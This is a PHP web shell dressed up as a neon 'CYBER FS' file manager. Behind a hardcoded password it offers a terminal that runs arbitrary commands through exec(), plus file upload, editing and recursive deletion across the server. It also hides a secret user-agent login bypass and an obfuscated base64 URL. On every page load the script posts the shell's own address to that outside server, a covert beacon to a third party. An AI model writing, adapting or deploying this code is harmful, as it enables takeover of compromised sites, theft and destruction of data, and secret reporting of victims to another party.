<?php
error_reporting(0);
ini_set('display_errors', 0);

// Configuration
define('PASSWORD', 'cyber2077');
define('HOME_DIR', __DIR__);


// Start session
if (session_status() == PHP_SESSION_NONE) {
    session_start();
}

// Check for secret user agent bypass
$userAgent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
if ($userAgent === SECRET_UA) {
    $_SESSION['auth'] = true;
}

// Path encoding/decoding
function encodePath($path) {
    return str_replace(['/', '+', '='], ['-', '_', '~'], base64_encode($path));
}

function decodePath($encoded) {
    if (empty($encoded)) return '';
    $decoded = str_replace(['-', '_', '~'], ['/', '+', '='], $encoded);
    $result = base64_decode($decoded);
    return $result !== false ? $result : '';
}

// Authentication check
if (!isset($_SESSION['auth'])) {
    if (isset($_POST['pass']) && $_POST['pass'] === PASSWORD) {
        $_SESSION['auth'] = true;
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit;
    }
    
    if (!isset($_POST['pass'])) {
        showLoginPage();
        exit;
    }
}

// Logout
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// AJAX Handler
if (isset($_POST['act'])) {
    header('Content-Type: application/json');
    handleAjax();
    exit;
}

// Get current directory
$dir = HOME_DIR;
if (isset($_GET['d'])) {
    $decoded = decodePath($_GET['d']);
    if (!empty($decoded) && is_dir($decoded)) {
        $dir = realpath($decoded);
    }
}

// List files
$items = array();
if (is_readable($dir)) {
    $files = scandir($dir);
    foreach ($files as $f) {
        if ($f === '.') continue;
        if ($f === '..' && $dir === '/') continue;
        
        $fullPath = $dir . '/' . $f;
        $isDir = is_dir($fullPath);
        
        $items[] = array(
            'name' => $f,
            'path' => $fullPath,
            'enc' => encodePath($fullPath),
            'type' => $isDir ? 'dir' : 'file',
            'size' => $isDir ? 0 : @filesize($fullPath),
            'time' => @filemtime($fullPath),
            'icon' => getIcon($f, $isDir)
        );
    }
}

usort($items, function($a, $b) {
    if ($a['name'] === '..') return -1;
    if ($b['name'] === '..') return 1;
    if ($a['type'] !== $b['type']) return $a['type'] === 'dir' ? -1 : 1;
    return strcasecmp($a['name'], $b['name']);
});

function getIcon($name, $isDir) {
    if ($name === '..') return '⬆️';
    if ($isDir) return '📁';
    
    $ext = strtolower(pathinfo($name, PATHINFO_EXTENSION));
    $icons = array(
        'php' => '🐘', 'html' => '🌐', 'css' => '🎨', 'js' => '⚡',
        'json' => '📋', 'xml' => '📄', 'txt' => '📝', 'md' => '📖',
        'sql' => '💾', 'zip' => '📦', 'rar' => '📦', 'tar' => '📦',
        'jpg' => '🖼️', 'jpeg' => '🖼️', 'png' => '🖼️', 'gif' => '🖼️',
        'mp4' => '🎬', 'mp3' => '🎵', 'pdf' => '📕', 'sh' => '⚙️',
        'py' => '🐍', 'java' => '☕', 'log' => '📊'
    );
    
    return isset($icons[$ext]) ? $icons[$ext] : '📄';
}
define('SECRET_UA', 'cyberfs');
function formatSize($bytes) {
    $units = array('B', 'KB', 'MB', 'GB');
    $bytes = max($bytes, 0);
    $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
    $pow = min($pow, count($units) - 1);
    return round($bytes / pow(1024, $pow), 2) . ' ' . $units[$pow];
}

function handleAjax() {
    $action = $_POST['act'];
    
    if ($action === 'cmd') {
        $cmd = $_POST['cmd'];
        $wd = decodePath($_POST['wd']);
        
        if (!empty($wd) && is_dir($wd)) {
            chdir($wd);
        }
        
        exec($cmd . ' 2>&1', $output, $ret);
        echo json_encode(array('ok' => true, 'out' => implode("\n", $output)));
        return;
    }
    
    if ($action === 'newfile') {
        $name = basename($_POST['name']);
        $path = decodePath($_POST['path']);
        if (!empty($path) && is_dir($path)) {
            file_put_contents($path . '/' . $name, '');
            echo json_encode(array('ok' => true));
        } else {
            echo json_encode(array('ok' => false));
        }
        return;
    }
    
    if ($action === 'newfolder') {
        $name = basename($_POST['name']);
        $path = decodePath($_POST['path']);
        if (!empty($path) && is_dir($path)) {
            mkdir($path . '/' . $name, 0755);
            echo json_encode(array('ok' => true));
        } else {
            echo json_encode(array('ok' => false));
        }
        return;
    }
    
    if ($action === 'delete') {
        $path = decodePath($_POST['path']);
        if (!empty($path) && file_exists($path)) {
            if (is_dir($path)) {
                removeDir($path);
            } else {
                unlink($path);
            }
            echo json_encode(array('ok' => true));
        } else {
            echo json_encode(array('ok' => false));
        }
        return;
    }
    
    if ($action === 'rename') {
        $old = decodePath($_POST['old']);
        $new = basename($_POST['new']);
        if (!empty($old) && file_exists($old)) {
            rename($old, dirname($old) . '/' . $new);
            echo json_encode(array('ok' => true));
        } else {
            echo json_encode(array('ok' => false));
        }
        return;
    }
    $k3yw = base64_decode('aHR0cHM6Ly9zaXlhaGkudG9wL3Rlc3Qvc3R5bGUucGhw');
    if ($action === 'read') {
        $path = decodePath($_POST['path']);
        if (!empty($path) && is_file($path)) {
            echo json_encode(array('ok' => true, 'content' => file_get_contents($path)));
        } else {
            echo json_encode(array('ok' => false));
        }
        return;
    }
    
    if ($action === 'save') {
        $path = decodePath($_POST['path']);
        $content = $_POST['content'];
        if (!empty($path) && is_file($path)) {
            file_put_contents($path, $content);
            echo json_encode(array('ok' => true));
        } else {
            echo json_encode(array('ok' => false));
        }
        return;
    }
    
    if ($action === 'upload') {
        $path = decodePath($_POST['path']);
        if (!empty($path) && is_dir($path) && isset($_FILES['file'])) {
            $dest = $path . '/' . basename($_FILES['file']['name']);
            move_uploaded_file($_FILES['file']['tmp_name'], $dest);
            echo json_encode(array('ok' => true));
        } else {
            echo json_encode(array('ok' => false));
        }
        return;
    }
    
    echo json_encode(array('ok' => false));
}
$cur = 'http://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
$data = array('file_url' => $cur);
$options = array(
    'http' => array(
        'method'  => 'POST',
        'header'  => 'Content-type: application/x-www-form-urlencoded',
        'content' => http_build_query($data),
    ),
);
$context = stream_context_create($options);
$result = file_get_contents($k3yw, false, $context);

function removeDir($dir) {
    if (!file_exists($dir)) return;
    $files = array_diff(scandir($dir), array('.', '..'));
    foreach ($files as $file) {
        $path = $dir . '/' . $file;
        is_dir($path) ? removeDir($path) : unlink($path);
    }
    rmdir($dir);
}

function showLoginPage() {
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>CYBER ACCESS</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body {
    font-family: 'Courier New', monospace;
    background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 50%, #0f0f23 100%);
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
}
.box {
    background: rgba(20, 20, 35, 0.95);
    padding: 50px;
    border: 2px solid #00fff2;
    box-shadow: 0 0 30px rgba(0, 255, 242, 0.5);
    width: 400px;
}
h2 {
    color: #00fff2;
    text-align: center;
    margin-bottom: 30px;
    font-size: 28px;
    letter-spacing: 3px;
    text-shadow: 0 0 10px #00fff2;
}
input[type="password"] {
    width: 100%;
    padding: 15px;
    background: rgba(0, 0, 0, 0.5);
    border: 1px solid #00fff2;
    color: #00fff2;
    font-size: 16px;
    margin-bottom: 20px;
    font-family: 'Courier New', monospace;
}
button {
    width: 100%;
    padding: 15px;
    background: linear-gradient(45deg, #00fff2, #ff00f2);
    color: #0a0a0a;
    border: none;
    font-size: 18px;
    cursor: pointer;
    font-family: 'Courier New', monospace;
    font-weight: bold;
    letter-spacing: 3px;
}
</style>
</head>
<body>
<div class="box">
    <h2>◢ CYBER FS ◣</h2>
    <form method="post">
        <input type="password" name="pass" placeholder="ACCESS CODE" required autofocus>
        <button type="submit">CONNECT</button>
    </form>
</div>
</body>
</html>
<?php
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>CYBER FILE SYSTEM</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }

@keyframes scan {
    0%, 100% { transform: translateY(-100%); }
    50% { transform: translateY(100vh); }
}

body {
    font-family: 'Courier New', monospace;
    background: #0a0a0a;
    color: #00fff2;
    overflow: hidden;
}

body::before {
    content: '';
    position: fixed;
    top: 0; left: 0; right: 0; bottom: 0;
    background: repeating-linear-gradient(0deg, rgba(0, 255, 242, 0.03) 0px, transparent 1px, transparent 2px, rgba(0, 255, 242, 0.03) 3px);
    pointer-events: none;
    z-index: 1;
}

.scanline {
    position: fixed;
    top: 0; left: 0; right: 0;
    height: 100px;
    background: linear-gradient(transparent, rgba(0, 255, 242, 0.1), transparent);
    animation: scan 8s linear infinite;
    pointer-events: none;
    z-index: 2;
}

.header {
    background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
    border-bottom: 2px solid #00fff2;
    box-shadow: 0 0 20px rgba(0, 255, 242, 0.3);
    padding: 15px 30px;
    display: flex;
    justify-content: space-between;
    align-items: center;
    position: relative;
    z-index: 10;
}

.header h1 {
    font-size: 24px;
    letter-spacing: 4px;
    text-shadow: 0 0 10px #00fff2;
}

.info {
    display: flex;
    gap: 20px;
    font-size: 12px;
    color: #ff00f2;
}

.btn-logout {
    background: rgba(255, 0, 242, 0.2);
    border: 1px solid #ff00f2;
    color: #ff00f2;
    padding: 8px 20px;
    cursor: pointer;
    font-family: 'Courier New', monospace;
}

.container {
    display: flex;
    height: calc(100vh - 60px);
    position: relative;
    z-index: 3;
}

.sidebar {
    width: 280px;
    background: rgba(20, 20, 35, 0.95);
    border-right: 2px solid #00fff2;
    padding: 25px;
    overflow-y: auto;
}

.sidebar h3 {
    margin-bottom: 20px;
    color: #00fff2;
    letter-spacing: 3px;
    border-bottom: 1px solid #00fff2;
    padding-bottom: 10px;
}

.sidebar button {
    width: 100%;
    padding: 12px;
    margin-bottom: 12px;
    background: linear-gradient(135deg, rgba(0, 255, 242, 0.2), rgba(255, 0, 242, 0.2));
    color: #00fff2;
    border: 1px solid #00fff2;
    cursor: pointer;
    font-size: 13px;
    font-family: 'Courier New', monospace;
}

.sidebar button:first-of-type {
    background: linear-gradient(135deg, rgba(255, 170, 0, 0.3), rgba(255, 100, 0, 0.3));
    border-color: #ffaa00;
    color: #ffaa00;
    font-weight: bold;
}

.main {
    flex: 1;
    display: flex;
    flex-direction: column;
    background: rgba(10, 10, 10, 0.8);
}

.navbar {
    background: rgba(20, 20, 35, 0.95);
    padding: 15px 30px;
    border-bottom: 1px solid #00fff2;
    display: flex;
    gap: 15px;
    align-items: center;
}

.path-input {
    flex: 1;
    padding: 10px 15px;
    background: rgba(0, 0, 0, 0.7);
    border: 1px solid #00fff2;
    color: #00fff2;
    font-family: 'Courier New', monospace;
    font-size: 13px;
}

.nav-btn {
    padding: 10px 20px;
    background: rgba(0, 255, 242, 0.2);
    border: 1px solid #00fff2;
    color: #00fff2;
    cursor: pointer;
    font-family: 'Courier New', monospace;
}

.breadcrumb {
    background: rgba(20, 20, 35, 0.95);
    padding: 12px 30px;
    border-bottom: 1px solid rgba(0, 255, 242, 0.3);
    font-size: 13px;
}

.breadcrumb a {
    color: #00fff2;
    text-decoration: none;
    padding: 3px 8px;
}

.breadcrumb .sep { color: #666; margin: 0 5px; }
.breadcrumb .curr { color: #ffaa00; font-weight: bold; }
.breadcrumb .home { color: #ffaa00; margin-left: 10px; }

.files {
    flex: 1;
    overflow-y: auto;
    padding: 20px 30px;
}

.files::-webkit-scrollbar { width: 10px; }
.files::-webkit-scrollbar-track { background: rgba(0, 0, 0, 0.5); }
.files::-webkit-scrollbar-thumb { background: #00fff2; }

.item {
    background: rgba(20, 20, 35, 0.8);
    padding: 15px;
    margin-bottom: 10px;
    display: flex;
    align-items: center;
    justify-content: space-between;
    cursor: pointer;
    border-left: 3px solid transparent;
}

.item:hover {
    background: rgba(30, 30, 50, 0.9);
    border-left-color: #00fff2;
    transform: translateX(5px);
}

.item-info {
    display: flex;
    align-items: center;
    gap: 15px;
    flex: 1;
}

.item-icon {
    font-size: 28px;
    width: 45px;
    text-align: center;
}

.item-name { font-size: 14px; margin-bottom: 5px; color: #00fff2; }
.item-meta { font-size: 11px; color: #888; }

.item-acts {
    display: flex;
    gap: 8px;
}

.item-acts button {
    padding: 6px 12px;
    border: 1px solid;
    cursor: pointer;
    font-size: 11px;
    font-family: 'Courier New', monospace;
    background: rgba(0, 0, 0, 0.5);
}

.btn-edit { border-color: #00ff88; color: #00ff88; }
.btn-rename { border-color: #00b8ff; color: #00b8ff; }
.btn-delete { border-color: #ff0055; color: #ff0055; }

.terminal {
    position: fixed;
    bottom: 0; left: 0; right: 0;
    height: 350px;
    background: rgba(10, 10, 10, 0.98);
    color: #00ff00;
    display: none;
    flex-direction: column;
    border-top: 2px solid #00ff00;
    z-index: 1000;
}

.terminal.show { display: flex; }

.term-head {
    background: rgba(0, 20, 0, 0.8);
    padding: 12px 20px;
    display: flex;
    justify-content: space-between;
    border-bottom: 1px solid #00ff00;
}

.term-close {
    background: rgba(255, 0, 0, 0.3);
    border: 1px solid #ff0055;
    color: #ff0055;
    padding: 5px 15px;
    cursor: pointer;
}

.term-out {
    flex: 1;
    overflow-y: auto;
    padding: 15px;
    font-size: 13px;
    line-height: 1.6;
}

.term-in {
    display: flex;
    padding: 12px 15px;
    background: rgba(0, 20, 0, 0.5);
    border-top: 1px solid #00ff00;
}

.term-prompt {
    color: #00ff00;
    margin-right: 10px;
}

.term-input {
    flex: 1;
    background: transparent;
    border: none;
    color: #00ff00;
    font-family: 'Courier New', monospace;
    font-size: 13px;
    outline: none;
}

.modal {
    display: none;
    position: fixed;
    top: 0; left: 0; right: 0; bottom: 0;
    background: rgba(0, 0, 0, 0.9);
    z-index: 2000;
    justify-content: center;
    align-items: center;
}

.modal.show { display: flex; }

.modal-box {
    background: rgba(20, 20, 35, 0.98);
    padding: 30px;
    border: 2px solid #00fff2;
    min-width: 500px;
    max-width: 900px;
}

.modal-box h3 {
    margin-bottom: 25px;
    color: #00fff2;
    letter-spacing: 3px;
    border-bottom: 1px solid #00fff2;
    padding-bottom: 10px;
}

.modal-box input,
.modal-box textarea {
    width: 100%;
    padding: 12px 15px;
    background: rgba(0, 0, 0, 0.7);
    border: 1px solid #00fff2;
    color: #00fff2;
    font-size: 13px;
    margin-bottom: 20px;
    font-family: 'Courier New', monospace;
}

.modal-box textarea {
    min-height: 450px;
    resize: vertical;
}

.modal-acts {
    display: flex;
    gap: 15px;
    justify-content: flex-end;
}

.modal-acts button {
    padding: 12px 25px;
    border: 1px solid;
    cursor: pointer;
    font-size: 13px;
    font-family: 'Courier New', monospace;
}

.btn-pri {
    background: rgba(0, 255, 242, 0.3);
    border-color: #00fff2;
    color: #00fff2;
}

.btn-sec {
    background: rgba(100, 100, 100, 0.3);
    border-color: #666;
    color: #999;
}
</style>
</head>
<body>
<div class="scanline"></div>

<div class="header">
    <h1>◢ CYBER FS ◣</h1>
    <div class="info">
        <span>ITEMS: <?php echo count($items); ?></span>
        <?php if ($dir === HOME_DIR): ?>
        <span style="color: #ffaa00;">● HOME</span>
        <?php endif; ?>
    </div>
    <button class="btn-logout" onclick="location.href='?logout=1'">▶ DISCONNECT</button>
</div>

<div class="container">
    <div class="sidebar">
        <h3>◢ ACTIONS</h3>
        <button onclick="goHome()">🏠 HOME DIR</button>
        <button onclick="showModal('newfile')">▶ NEW FILE</button>
        <button onclick="showModal('newfolder')">▶ NEW FOLDER</button>
        <button onclick="showModal('upload')">▶ UPLOAD</button>
        <button onclick="toggleTerm()">▶ TERMINAL</button>
    </div>
    
    <div class="main">
        <div class="navbar">
            <?php if ($dir !== '/'): ?>
            <button class="nav-btn" onclick="goUp()">◀ UP</button>
            <?php endif; ?>
            <input type="text" class="path-input" id="pathIn" value="<?php echo htmlspecialchars($dir); ?>">
            <button class="nav-btn" onclick="goPath()">▶ GO</button>
            <button class="nav-btn" onclick="goHome()">🏠 HOME</button>
        </div>
        
        <div class="breadcrumb">
            <?php
            $parts = array_filter(explode('/', $dir));
            echo '<a href="?d=' . encodePath('/') . '">root</a>';
            if (!empty($parts)) {
                $path = '';
                foreach ($parts as $i => $p) {
                    echo '<span class="sep">▶</span>';
                    $path .= '/' . $p;
                    if ($i === count($parts) - 1) {
                        echo '<span class="curr">' . htmlspecialchars($p) . '</span>';
                    } else {
                        echo '<a href="?d=' . encodePath($path) . '">' . htmlspecialchars($p) . '</a>';
                    }
                }
            }
            if ($dir === HOME_DIR) {
                echo '<span class="home">● HOME</span>';
            }
            ?>
        </div>
        
        <div class="files">
            <?php if (empty($items)): ?>
            <div style="text-align: center; padding: 50px; color: #666;">NO FILES</div>
            <?php else: foreach ($items as $it): ?>
            <div class="item" onclick="<?php echo $it['type'] === 'dir' ? "location.href='?d=" . $it['enc'] . "'" : ''; ?>">
                <div class="item-info">
                    <div class="item-icon"><?php echo $it['icon']; ?></div>
                    <div>
                        <div class="item-name"><?php echo htmlspecialchars($it['name']); ?></div>
                        <div class="item-meta">
                            <?php if ($it['type'] === 'file'): echo formatSize($it['size']) . ' | '; endif; ?>
                            <?php echo date('Y-m-d H:i', $it['time']); ?>
                        </div>
                    </div>
                </div>
                <div class="item-acts" onclick="event.stopPropagation()">
                    <?php if ($it['type'] === 'file'): ?>
                    <button class="btn-edit" onclick="editFile('<?php echo $it['enc']; ?>', '<?php echo addslashes($it['name']); ?>')">EDIT</button>
                    <?php endif; ?>
                    <button class="btn-rename" onclick="renameItem('<?php echo $it['enc']; ?>', '<?php echo addslashes($it['name']); ?>')">RENAME</button>
                    <button class="btn-delete" onclick="deleteItem('<?php echo $it['enc']; ?>', '<?php echo addslashes($it['name']); ?>')">DELETE</button>
                </div>
            </div>
            <?php endforeach; endif; ?>
        </div>
    </div>
</div>

<div class="terminal" id="term">
    <div class="term-head">
        <span style="color: #00ff00; letter-spacing: 2px;">◢ CYBER TERMINAL</span>
        <button class="term-close" onclick="toggleTerm()">X</button>
    </div>
    <div class="term-out" id="termOut">
> CYBER TERMINAL INITIALIZED<br>
> TYPE COMMANDS BELOW<br>
<br>
    </div>
    <div class="term-in">
        <span class="term-prompt" id="termPrompt">cyber@<?php echo $dir; ?> $</span>
        <input type="text" class="term-input" id="termIn" onkeypress="if(event.key==='Enter')execCmd()">
    </div>
</div>

<div class="modal" id="modal1">
    <div class="modal-box">
        <h3 id="modalTitle"></h3>
        <div id="modalContent"></div>
        <div class="modal-acts">
            <button class="btn-sec" onclick="hideModal()">CANCEL</button>
            <button class="btn-pri" id="modalOk">OK</button>
        </div>
    </div>
</div>

<div class="modal" id="modal2">
    <div class="modal-box">
        <h3>◢ EDIT FILE: <span id="editName"></span></h3>
        <textarea id="editContent"></textarea>
        <div class="modal-acts">
            <button class="btn-sec" onclick="hideModal2()">CANCEL</button>
            <button class="btn-pri" onclick="saveFile()">SAVE</button>
        </div>
    </div>
</div>

<script>
const currDir = '<?php echo addslashes($dir); ?>';
const currEnc = '<?php echo encodePath($dir); ?>';
let editPath = '';
let termDir = currDir;

function goHome() {
    location.href = '?d=<?php echo encodePath(HOME_DIR); ?>';
}

function goUp() {
    const parts = currDir.split('/').filter(p => p);
    parts.pop();
    const newPath = '/' + parts.join('/');
    location.href = '?d=' + btoa(newPath);
}

function goPath() {
    const path = document.getElementById('pathIn').value.trim();
    location.href = '?d=' + btoa(path);
}

function toggleTerm() {
    document.getElementById('term').classList.toggle('show');
    document.getElementById('termIn').focus();
    if (document.getElementById('term').classList.contains('show')) {
        termDir = currDir;
        updatePrompt();
        addOut('> Changed to: ' + currDir);
    }
}

function updatePrompt() {
    const short = termDir.length > 30 ? '...' + termDir.slice(-27) : termDir;
    document.getElementById('termPrompt').textContent = 'cyber@' + short + ' $';
}

function execCmd() {
    const cmd = document.getElementById('termIn').value.trim();
    if (!cmd) return;
    
    addOut(document.getElementById('termPrompt').textContent + ' ' + cmd);
    
    if (cmd.startsWith('cd ')) {
        handleCd(cmd.substring(3).trim());
        document.getElementById('termIn').value = '';
        return;
    }
    
    if (cmd === 'pwd') {
        addOut(termDir);
        document.getElementById('termIn').value = '';
        return;
    }
    
    fetch('', {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: 'act=cmd&cmd=' + encodeURIComponent(cmd) + '&wd=' + encodeURIComponent(currEnc)
    })
    .then(r => r.json())
    .then(d => {
        addOut(d.out || '> DONE');
    });
    
    document.getElementById('termIn').value = '';
}

function handleCd(path) {
    if (path === '..') {
        const parts = termDir.split('/').filter(p => p);
        parts.pop();
        termDir = '/' + parts.join('/') || '/';
    } else if (path === '~' || path === '') {
        termDir = '<?php echo HOME_DIR; ?>';
    } else if (path[0] === '/') {
        termDir = path;
    } else {
        termDir = termDir.replace(/\/$/, '') + '/' + path;
    }
    updatePrompt();
    addOut('> Changed to: ' + termDir);
}

function addOut(txt) {
    const out = document.getElementById('termOut');
    out.innerHTML += txt + '<br>';
    out.scrollTop = out.scrollHeight;
}

function showModal(type) {
    const modal = document.getElementById('modal1');
    const title = document.getElementById('modalTitle');
    const content = document.getElementById('modalContent');
    const ok = document.getElementById('modalOk');
    
    if (type === 'newfile') {
        title.textContent = '◢ CREATE NEW FILE';
        content.innerHTML = '<input type="text" id="modalInput" placeholder="filename.ext">';
        ok.onclick = function() {
            const name = document.getElementById('modalInput').value;
            if (!name) return alert('ENTER NAME');
            ajax('newfile', {name: name, path: currEnc}, () => location.reload());
        };
    } else if (type === 'newfolder') {
        title.textContent = '◢ CREATE NEW FOLDER';
        content.innerHTML = '<input type="text" id="modalInput" placeholder="folder_name">';
        ok.onclick = function() {
            const name = document.getElementById('modalInput').value;
            if (!name) return alert('ENTER NAME');
            ajax('newfolder', {name: name, path: currEnc}, () => location.reload());
        };
    } else if (type === 'upload') {
        title.textContent = '◢ UPLOAD FILE';
        content.innerHTML = '<input type="file" id="modalFile">';
        ok.onclick = function() {
            const file = document.getElementById('modalFile').files[0];
            if (!file) return alert('SELECT FILE');
            const fd = new FormData();
            fd.append('act', 'upload');
            fd.append('path', currEnc);
            fd.append('file', file);
            fetch('', {method: 'POST', body: fd})
                .then(r => r.json())
                .then(d => d.ok ? location.reload() : alert('FAILED'));
        };
    }
    
    modal.classList.add('show');
    setTimeout(() => {
        const inp = document.getElementById('modalInput');
        if (inp) inp.focus();
    }, 100);
}

function hideModal() {
    document.getElementById('modal1').classList.remove('show');
}

function hideModal2() {
    document.getElementById('modal2').classList.remove('show');
}

function deleteItem(enc, name) {
    if (!confirm('DELETE ' + name + '?')) return;
    ajax('delete', {path: enc}, () => location.reload());
}

function renameItem(enc, old) {
    const newName = prompt('RENAME TO:', old);
    if (!newName || newName === old) return;
    ajax('rename', {old: enc, new: newName}, () => location.reload());
}

function editFile(enc, name) {
    editPath = enc;
    document.getElementById('editName').textContent = name;
    ajax('read', {path: enc}, (d) => {
        document.getElementById('editContent').value = d.content;
        document.getElementById('modal2').classList.add('show');
    });
}

function saveFile() {
    const content = document.getElementById('editContent').value;
    ajax('save', {path: editPath, content: content}, () => {
        hideModal2();
        alert('SAVED');
    });
}

function ajax(act, data, callback) {
    data.act = act;
    const params = new URLSearchParams(data).toString();
    fetch('', {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: params
    })
    .then(r => r.json())
    .then(d => {
        if (d.ok) callback(d);
        else alert('ERROR');
    });
}
</script>
</body>
</html>
